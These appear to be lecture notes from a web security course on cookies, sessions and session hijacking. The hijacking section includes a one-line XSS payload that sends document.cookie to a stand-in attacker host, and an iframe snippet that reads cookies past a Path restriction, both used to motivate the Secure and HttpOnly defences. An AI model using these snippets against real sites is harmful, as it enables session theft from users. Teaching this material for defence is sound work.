---
title: Lecture 3 Session Attacks
---


* The server can set cookies with `Set-Cookie: theme=dark;` (Header Name, Cookie Name, Cookie Value).
* The browser automatically adds cookies with every request.
* Cookies are so old they precede the SOP. You basically set an expiration date on the Cookie and clear it by setting a date in the past.
* Sign cookies to prevent tampering.

### Sessions
* Server wants to keep data about the user over multiple requests. (ex: Logins, shopping carts, user tracking)
* **Ambient Authority**: access control based on global/persistent property of the user (as long as they specify an action, it will be done).
There are 4 ways of doing this: Cookies (common), IP checking (used at Stanford for lib resources), built-in HTTP auth (rare), client certs (rare)
* Generate a random number, use that as session ID and store it. Make these unguessable and delete them from DB on logout.

### Signature Schemes
* Triple of algorithms (G, S, V)
* Generator (`G() -> (pk, sk)`), Signer (`S(sk, x) -> t`), Verifier (`V(pk, x, t) -> accept/reject`).

### History of Cookies
* Implemented in 1994 in Netscape, described in 4 pages. No spec for 17 years.
* Ad-hoc design has led to interesting issues.
* There were several attempts but they had incompatible changes -- one in 1997, another in 2000 (Cookie2), and finally one succeeded (RFC 6265) in 2011.
* Cookies are a weird special case that behaves differently from everything else on the web.

### Cookie Attributes
* Expires: Specifies expiration date. If no date, lasts for session (until you close browser, but now there's session restoration).
* Path: Scope the "Cookie" header to a particular path prefix. e.g. `Path=/docs` matches `/docs` and `/docs/web`. Don't use this for security.

### Accessing Cookies from JS
* `document.cookie = 'name=Feross'`
* `document.cookie = 'favoriteFood=Cookies; Path=/'`
* `document.cookie` is now `name=Feross; favoriteFood=Cookies;` (it didn't delete)
* `document.cookie = 'name=; Expires=Thu, 01 Jan 1070...'` in order to delete

### Session Hijacking
* Session hijacking works by stealing cookies.
* This can happen over HTTP (not S).
* Use `Secure` cookie attribute to prevent the cookie from being sent over unencrypted HTTP.
* e.g. `Set-Cookie: key=value; Secure` (or just use HTTPS for the whole website.)
* XSS: Attacker can insert their code and easily exfiltrate the user's cookie. 
* e.g. `new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie`
* Protect cookies from XSS: Prevent it from being used in JS: `Set-Cookie: key-value; Secure; Httponly`

#### How to get around path restriction for cookies: add an iframe. 
```
const iframe = document.createElement('iframe')
iframe.src= = 'https://web.stanford.edu/class/cs106a'
document.body.append(iframe)
iframe.style.display = 'none' // Set iframe to be invisible
// contentDocument is the equivalent of their document. We can cross
// this boundary to see their equivalent of document
iframe.contentDocument.cookie
```
Only use path as an optimization!



